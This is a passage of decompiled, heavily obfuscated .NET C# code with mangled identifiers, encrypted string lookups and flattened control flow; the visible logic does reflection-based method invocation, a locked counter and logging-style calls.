        strArray[2] = (string) \u0040Ԙ.\u0040ӕ.\u0040Ӛ(558000);
        strArray[3] = (string) \u0040Ԙ.\u0040ӕ.\u0040ӛ((object) this.\u0040ӓ[1].GetType().Assembly);
        strArray[4] = (string) \u0040Ԙ.\u0040ӕ.\u0040Ӛ(558008);
        object obj = \u0040Ԙ.\u0040ӕ.\u0040Ӝ((object) strArray);
        \u0040ԝ.\u0040Օ((\u0040Ԙ) ӓ, (string) obj);
        MethodInfo methodInfo = (MethodInfo) this.\u0040ӓ[0];
        List<object[]> objArrayList1 = new List<object[]>();
        List<object[]> objArrayList2;
        if (\u0040Ԙ.\u0040ӕ.\u0040ӝ((object) methodInfo).Length == 1)
          objArrayList2 = (List<object[]>) \u0040Ԙ.\u0040ӕ.\u0040Ӟ((object) methodInfo, this.\u0040ӓ[1], (object) new object[1]
          {
            (object) ((\u0040Ԙ.\u0040ӓ) ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӗ).\u0040ӕ
          });
        else
          objArrayList2 = (List<object[]>) \u0040Ԙ.\u0040ӕ.\u0040Ӟ((object) methodInfo, this.\u0040ӓ[1], (object) null);
        objArrayList2.ForEach(((\u0040Ԙ.\u0040ӓ) ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӗ).\u0040ә ?? (((\u0040Ԙ.\u0040ӓ) ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӗ).\u0040ә = new Action<object[]>(((\u0040Ԙ.\u0040ӓ) ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӗ).\u0040Ӟ)));
        object ӕ = ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040Ӕ;
        bool lockTaken = false;
        try
        {
          Monitor.Enter(ӕ, ref lockTaken);
          int num2 = 0;
          if (true)
            goto label_7;
label_6:
          ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӕ = num1 + 1;
          goto label_9;
label_7:
          while (true)
          {
            switch (num2)
            {
              case 0:
                num1 = ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӕ;
                \u0040Ԙ.\u0040ӕ.\u0040Ә();
                num2 = \u0040Ԙ.\u0040ӕ.\u0040ә() ? 3 : 4;
                continue;
              case 1:
              case 4:
                goto label_6;
              case 5:
                goto label_10;
              default:
                goto label_9;
            }
          }
label_10:
          return;
label_9:
          \u0040ԝ.\u0040ڲ((\u0040Ԙ) ((\u0040Ԙ.\u0040ӓ) ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӗ).\u0040ӓ, (string) \u0040Ԙ.\u0040ӕ.\u0040Ӝ((object) new string[5]
          {
            (string) \u0040Ԙ.\u0040ӕ.\u0040Ӛ(555862),
            ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӕ.ToString(),
            (string) \u0040Ԙ.\u0040ӕ.\u0040Ӛ(555922),
            ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040Ӗ.ToString(),
            (string) \u0040Ԙ.\u0040ӕ.\u0040Ӛ(555928)
          }), ((\u0040Ԙ.\u0040ӓ) ((\u0040Ԙ.\u0040Ӕ) this.\u0040Ӕ).\u0040ӗ).\u0040Ӕ);
          num2 = 5;
          goto label_7;
        }
        finally
        {
          if (lockTaken)
            \u0040Ԙ.\u0040ӕ.\u0040ӟ(ӕ);
        }
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӗ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ә() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӛ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӛ(object _param0) => (object) ((Assembly) _param0).FullName;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӝ(object _param0) => (object) string.Concat((string[]) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӝ(object _param0) => (object) ((MethodBase) _param0).GetParameters();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӟ(object _param0, object _param1, object _param2) => ((MethodBase) _param0).Invoke(_param1, (object[]) _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӟ(object _param0) => Monitor.Exit(_param0);
  }

  [Serializable]
  private sealed class JTH8NFKtI4P0aeV3Vqq
  {
    public static readonly object wwZApPnf5e;
    public static Func<object, bool> chDAf2iNqw;

    [MethodImpl(MethodImplOptions.NoInlining)]
    static JTH8NFKtI4P0aeV3Vqq()
    {
      \u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.f6cs1LQGW2xO0mw0hgy();
      \u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.wwZApPnf5e = (object) new \u0040Ԙ.JTH8NFKtI4P0aeV3Vqq();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public JTH8NFKtI4P0aeV3Vqq()
    {
      \u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.f6cs1LQGW2xO0mw0hgy();
      \u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.lZYKQJQaoeVaAQ98NmR((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal bool Nn5AamJXwh(object _param1) => !\u0040Ԙ.JTH8NFKtI4P0aeV3Vqq.lHZcifQIWpM51WoyIAU((object) (string) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void f6cs1LQGW2xO0mw0hgy() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool xUwoixQxRCQgXLZdkCx() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool fCw6fdQMPuFo1fMLvTK() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void lZYKQJQaoeVaAQ98NmR([In] object obj0) => obj0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool lHZcifQIWpM51WoyIAU([In] object obj0) => string.IsNullOrEmpty((string) obj0);
  }
}
